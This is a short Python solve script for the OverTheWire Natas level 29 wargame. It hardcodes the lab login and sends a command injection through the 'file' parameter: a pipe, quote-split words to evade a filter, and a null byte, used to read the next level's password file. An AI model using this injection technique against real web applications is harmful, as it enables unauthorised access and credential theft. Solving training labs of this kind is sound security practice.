import requests
import re
username ='natas29'
password ='airooCaiseiyee8he8xongien9euhe8b'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

command='|cat+/etc/na""tas_webpass/nat""as30%00'
fc = (requests.utils.quote(command))

responce = requests.get(url + "?file="+command,auth=(username,password))
print(responce.text)
print("password for natas 30 is : "+re.findall("</html>\n(.*)",responce.text)[0])

